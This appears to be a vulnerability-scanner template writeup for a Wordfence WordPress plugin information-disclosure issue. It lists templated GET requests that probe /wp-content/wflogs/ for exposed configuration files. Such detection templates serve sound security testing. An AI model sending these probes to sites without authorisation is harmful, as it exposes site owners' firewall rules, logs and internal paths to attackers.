# Nuclei Template: WordPress Wordfence - Configuration File Disclosure
**Template ID:** wordfence-config-disclosure
**Vulnerability Class:** Information Disclosure
**Severity:** Medium
**CWE:** CWE-200
**Source:** Nuclei Template (`wordfence-config-disclosure.yaml`)

## Vulnerability Information & PoC

## Description
The Wordfence Security plugin for WordPress stores configuration files in the /wp-content/wflogs/ directory. These files may be accessible without authentication and can expose sensitive configuration data, firewall rules, attack logs, and internal paths.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/wp-content/wflogs/config.php
GET {{BaseURL}}/wp-content/wflogs/config-synced.php
```

## References
- https://wordpress.org/support/topic/files-created-in-wflogs-before-plugin-activated/
- https://forum.ait-pro.com/forums/topic/wordfence-firewall-wp-contentwflogsconfig-php-file-quarantined/
